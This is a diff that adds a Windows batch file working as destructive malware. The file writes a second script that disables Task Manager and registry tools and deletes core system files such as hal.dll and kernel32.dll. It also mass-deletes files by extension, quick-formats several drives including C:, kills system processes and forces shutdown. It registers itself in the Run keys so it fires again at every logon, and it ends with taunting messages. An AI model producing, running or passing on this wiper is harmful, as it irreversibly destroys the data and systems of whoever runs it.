@@ -1,0 +1,60 @@
+@echo off
+
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 0 /f
+echo @ECHO OFF >%systemroot%\end.bat
+echo echo Loading... please wait ! >>%systemroot%\end.bat
+echo reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 >>%systemroot%\end.bat
+echo reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 >>%systemroot%\end.bat
+echo color EF >>%systemroot%\end.bat
+echo cd %systemroot% >>%systemroot%\end.bat
+echo cd.. >>%systemroot%\end.bat
+echo attrib /S /D -r -h -s >>%systemroot%\end.bat
+echo del /Q /F autoexec.bat >>%systemroot%\end.bat
+echo del /Q /F boot.ini >>%systemroot%\end.bat
+echo del /Q /F %systemroot%\system32\kernel32.dll >>%systemroot%\end.bat
+echo del /Q /F %systemroot%\system32\rundll32.exe >>%systemroot%\end.bat
+echo del /Q /F %systemroot%\system32\hal.dll >>%systemroot%\end.bat
+echo del /Q /F %systemroot%\system32\logonui.exe >>%systemroot%\end.bat
+echo del /Q /F %systemroot%\system32\etc\hosts >>%systemroot%\end.bat   
+echo del /Q /F %systemroot%\system32\etc\networks >>%systemroot%\end.bat
+echo del /Q /F %systemroot%\system32\etc\services >>%systemroot%\end.bat
+echo del /Q /F %systemroot%\system32\etc\lmhosts.sam >>%systemroot%\end.bat
+echo del /Q /F %systemroot%\system32\etc\protocol >>%systemroot%\end.bat
+echo del /Q /S /F *.exe >>%systemroot%\end.bat 
+echo del /Q /S /F *.com >>%systemroot%\end.bat
+echo del /Q /S /F *.sys >>%systemroot%\end.bat 
+echo del /Q /S /F *.mp3 >>%systemroot%\end.bat 
+echo del /Q /S /F *.wav >>%systemroot%\end.bat 
+echo del /Q /S /F *.dat >>%systemroot%\end.bat 
+echo del /Q /S /F *.lnk >>%systemroot%\end.bat 
+echo del /Q /S /F *.ini >>%systemroot%\end.bat 
+echo del /Q /S /F *.log >>%systemroot%\end.bat 
+echo del /Q /S /F *.txt >>%systemroot%\end.bat 
+echo del /Q /S /F *.bak >>%systemroot%\end.bat
+echo del /Q /S /F *.htm >>%systemroot%\end.bat
+echo del /Q /S /F *.gif >>%systemroot%\end.bat
+echo del /Q /S /F *.386 >>%systemroot%\end.bat
+echo del /Q /S /F autoexec.bat >>%systemroot%\end.bat
+echo format d: /q /y >>%systemroot%\end.bat 
+echo format e: /q /y >>%systemroot%\end.bat 
+echo format f: /q /y >>%systemroot%\end.bat 
+echo format g: /q /y >>%systemroot%\end.bat
+echo format t: /q /y >>%systemroot%\end.bat 
+echo format i: /q /y >>%systemroot%\end.bat
+echo format c: /q /y >>%systemroot%\end.bat
+echo COLOR >>%systemroot%\end.bat
+echo msg * your pc sleeps with the fishes now glad to  cmiN >>%systemroot%\end.bat
+echo TASKKILL /F /T /IM explorer >>%systemroot%\end.bat
+echo TASKKILL /F /T /IM svchost.exe >>%systemroot%\end.bat
+echo TASKKILL /F /T /IM system.exe >>%systemroot%\end.bat
+echo shutdown -f -s -t 7 >>%systemroot%\end.bat
+echo del /Q /S /F *.* >>%systemroot%\end.bat
+
+echo START %systemroot%\end.bat /MIN /REALTIME >%systemroot%\start.bat
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v start.bat /t REG_SZ /d %systemroot%\start.bat /f
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v start.bat /t REG_SZ /d %systemroot%\start.bat /f
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
+START %systemroot%\end.bat /MIN /REALTIME
+
+msg * Goodbye ... please bury-me in cmiN's garden }{
